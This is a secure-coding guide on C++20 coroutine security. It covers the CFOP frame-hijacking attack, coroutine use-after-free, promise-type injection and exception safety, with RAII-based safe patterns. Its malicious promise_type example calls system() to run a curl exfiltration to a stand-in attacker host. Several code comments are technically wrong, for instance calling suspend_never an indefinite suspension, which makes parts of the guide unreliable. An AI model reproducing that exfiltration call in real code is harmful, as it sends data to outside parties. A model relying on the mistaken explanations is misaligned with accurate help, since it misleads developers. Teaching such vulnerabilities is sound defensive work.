---
source: "languages/c-cpp/coroutine-security.md"
title: "🔴 C++20 Coroutine Security"
category: "language-vuln"
language: "c-cpp"
severity: "critical"
tags: [c-cpp, coroutine, does, frame-oriented, language-vuln, lifetime, promise, type, what]
---

# 🔴 C++20 Coroutine Security

## What Is It?

Coroutines (independent functions) introduced in C++20 simplify asynchronous programming. However, **coroutine frames** are stored on the heap and contain local variables, function pointers, and vtable pointers that **live across suspension points**.

This opens a new attack surface that bypasses traditional stack-based security models.

## How Does It Appear in Vibe Coding?

```
Prompt: "Write a coroutine that makes an async HTTP request"
AI: "Writes a simple generator coroutine.
     But doesn't consider the security of pointers living in the coroutine frame!"
```

## Coroutine Frame-Oriented Programming (CFOP)

**CFOP**, presented at **USENIX Security 2025** and demonstrated at **Black Hat USA 2025**, is a new code-reuse attack exploiting the security vulnerabilities of C++ coroutines.

**Discovery:** CISPA Helmholtz Center
**Source:** https://cispa.de/en/cfop
**Paper:** https://www.usenix.org/conference/usenixsecurity25/presentation/bajo

### Attack Vector

```
Coroutine Frame (On Heap)
┌─────────────────────────┐
│ promise_type            │
│ local variables         │ ← Lives across suspension points
│ function pointers       │ ← Not protected by CFI!
│ return address          │
│ vtable pointer (if any) │ ← Hijackable!
└─────────────────────────┘
```

### How CFOP Works

```cpp
// 💀 DANGEROUS — Pointer living in coroutine frame
Task<int> vulnerable_coroutine(UserInput& input) {
    // Lives in the coroutine frame (on heap)
    int* data = new int[input.size()];  
    
    // Suspend — coroutine frame is frozen at this point
    co_await some_operation();
    
    // Resume — frame is still on heap, but data may have changed!
    // Attacker can manipulate the frame!
    process(data);
    
    co_return 42;
}
```

CFOP bypasses CFI (Control Flow Integrity) protections by modifying **function pointers** and **return addresses** in the coroutine frame.

### All Compilers Affected

| Compiler | Version | Status |
|----------|---------|--------|
| **GCC** | All | Vulnerable |
| **Clang/LLVM** | All | Vulnerable |
| **MSVC** | All | Vulnerable |

## 2. Coroutine Lifetime & Use-After-Free

Since coroutine frames are stored on the heap, the frame must be cleaned up when the coroutine's lifetime ends. But:

```cpp
// 💀 DANGEROUS — Coroutine UAF
Task<int> dangerous() {
    auto* ptr = new int(42);
    
    co_await suspend_never{};  // Suspended indefinitely
    
    // This line never runs — if the coroutine is cancelled
    // ptr leaks or the frame is deleted but ptr is still there
    delete ptr;
}

// Usage:
auto task = dangerous();  // Coroutine frame on heap
task.destroy();           // Frame deleted — but what about the pointers inside?
```

## 3. Promise Type Injection

The coroutine's promise_type controls coroutine behavior. If an attacker can inject their own promise_type:

```cpp
// 💀 DANGEROUS — Control via promise type
struct MaliciousPromise {
    auto initial_suspend() { 
        // Attacker can run code here
        system("curl http://attacker.com/exfil");
        return suspend_never{};
    }
    
    auto final_suspend() noexcept { return suspend_never{}; }
    void return_void() {}
    void unhandled_exception() {}
};

template<>
struct std::coroutine_traits<int> {
    using promise_type = MaliciousPromise;  // Hijack!
};
```

## 4. Coroutine & Exception Safety

```cpp
// 💀 DANGEROUS — No exception safety
Task<void> unsafe() {
    auto resource = acquire_resource();
    
    try {
        co_await async_operation();  // If exception thrown here
    } catch (...) {
        // resource is not released! — Leak
        throw;
    }
    
    release_resource(resource);
}
```

## 5. Real-World Exploit: Stack Pivoting via Coroutine Frame

CISPA researchers have achieved a stack pivoting attack using **dangling pointers** in the coroutine frame. This bypasses ASLR and CFI protections.

**Black Hat USA 2025 presentation:**
https://i.blackhat.com/BH-USA-25/Presentations/USA-25-Bajo-Coroutine-Frame-Oriented-Programming-Breaking.pdf

## Safe Coroutine Usage

```cpp
// ✅ SAFE — Resource management
Task<void> safe() {
    // RAII-based resource management
    auto resource = std::make_unique<Resource>();
    
    co_await async_operation();
    
    // unique_ptr destructor releases automatically
    // Works even if the coroutine is cancelled!
}

// ✅ SAFE — Coroutine lifetime control
Task<int> safe_coroutine() {
    std::vector<int> data(100);  // Not on stack, in the frame
    // But managed with RAII, so it's safe
    
    co_await async_op();
    
    co_return data.size();
}
```

## Prevention Methods

1. **Avoid storing pointers in coroutine frames**
2. **Use RAII** — smart pointers instead of raw pointers
3. **Manage coroutine lifetime correctly** — frame must be cleaned up when destroyed
4. **Don't rely on CFI protections** — CFOP bypasses CFI
5. **Wait for modern C++23 and later** — Fixes planned in the language standard

## References

- https://cispa.de/en/cfop
- https://www.usenix.org/conference/usenixsecurity25/presentation/bajo
- https://syssec.cispa.io/coroutine-cfop/
- https://github.com/coroutine-cfop/cfop
- https://i.blackhat.com/BH-USA-25/Presentations/USA-25-Bajo-Coroutine-Frame-Oriented-Programming-Breaking.pdf
- https://dl.acm.org/doi/10.5555/3766078.3766458
